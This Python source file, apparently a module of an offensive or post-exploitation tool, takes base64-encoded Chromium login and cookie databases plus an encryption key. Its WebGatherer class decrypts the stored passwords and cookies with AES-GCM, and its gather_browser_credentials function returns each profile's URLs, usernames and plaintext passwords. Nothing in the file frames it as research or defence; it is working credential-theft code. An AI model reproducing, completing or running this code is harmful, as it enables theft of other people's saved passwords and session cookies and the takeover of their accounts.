from typing import List, Dict, Any
from datetime import datetime, timedelta
from base64 import b64decode

import aiosqlite
import aiofiles
import aiofiles.os
import aiofiles.tempfile

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from ...Models.ModulesSchemas.Collection import (
    GatherCredentialsResult, 
    CredentialType,
    PasswordRecord,
    BrowserResult,
    ProfileResult
)


class WebGatherer:
    _SQL = {
        CredentialType.PASSWORD: """
            SELECT
                origin_url,
                date_last_used,
                date_created,
                username_value,
                password_value
            FROM logins
            ORDER BY date_created
        """,
        CredentialType.COOKIES: """
            SELECT
                host_key,
                value,
                creation_utc,
                last_access_utc,
                expires_utc,
                encrypted_value
            FROM cookies
        """
    }

    def __init__(self, db_path: str, aes_key: bytes, cred_type: CredentialType):
        self.db_path = db_path
        self.aes_key = aes_key
        self.cred_type = cred_type

    async def fetch(self) -> List[Dict[str, Any]]:
        async with aiosqlite.connect(self.db_path) as conn:
            rows = await conn.execute_fetchall(self._SQL[self.cred_type])
            rows = rows[::-1]

        if self.cred_type == CredentialType.PASSWORD:
            return [self._make_password_record(r) for r in rows]
        else:
            return [self._make_cookie_record(r) for r in rows]

    def _make_password_record(self, row: tuple) -> Dict[str, Any]:
        url, last_used, created, username, encrypted_val = row
        dec = self._decrypt(encrypted_val[3:15], encrypted_val[15:])
        return {
            "url": url,
            "created": self._chrome_timestamp_to_str(created),
            "last_used": self._chrome_timestamp_to_str(last_used),
            "username": username,
            "password": dec
        }

    def _make_cookie_record(self, row: tuple) -> Dict[str, Any]:
        host, value, created, last_used, expires, enc = row
        dec = value if value else self._decrypt(enc[3:15], enc[15:])
        domain = host[1:] if host.startswith('.') else host
        return {
            "domain": domain,
            "creation_time": self._chrome_timestamp_to_str(created),
            "last_access_time": self._chrome_timestamp_to_str(last_used),
            "expires": self._chrome_timestamp_to_str(expires),
            "decrypted_cookie": dec
        }

    def _decrypt(self, iv: bytes, ct: bytes) -> str:
        try:
            data, tag = ct[:-16], ct[-16:]
            cipher = Cipher(algorithms.AES(self.aes_key), modes.GCM(iv, tag)).decryptor()
            return (cipher.update(data) + cipher.finalize()).decode("utf-8", errors="replace")
        except Exception:
            return ""

    def _chrome_timestamp_to_str(self, val: int) -> str:
        # Chrome timestamps are microseconds since 1601-01-01
        if val <= 0:
            return "0000-00-00 00:00:00"
        epoch = datetime(1601, 1, 1)
        return (epoch + timedelta(microseconds=val)).strftime("%Y-%m-%d %H:%M:%S")


async def gather_browser_credentials(input_dict: dict) -> GatherCredentialsResult:
    results = []

    for browser_name, bdata in input_dict.items():
        aes_key = b64decode(bdata["encrypted_key"])
        profile_results = []

        for p in bdata["profiles"]:
            tmp_name = None
            try:
                async with aiofiles.tempfile.NamedTemporaryFile(mode="wb", delete=False) as tmp:
                    await tmp.write(b64decode(p["login_data_base64"]))
                    await tmp.flush()
                    tmp_name = tmp.name

                gatherer = WebGatherer(
                    db_path=tmp_name,
                    aes_key=aes_key,
                    cred_type=CredentialType.PASSWORD
                )
                raw_records = await gatherer.fetch()
                password_records = [PasswordRecord(**rec) for rec in raw_records]
                profile_results.append(ProfileResult(profile=p["profile"], credentials=password_records))

            finally:
                if tmp_name and await aiofiles.os.path.exists(tmp_name):
                    await aiofiles.os.remove(tmp_name)

        results.append(BrowserResult(browser=browser_name, profiles=profile_results))

    return GatherCredentialsResult(browsers=results)

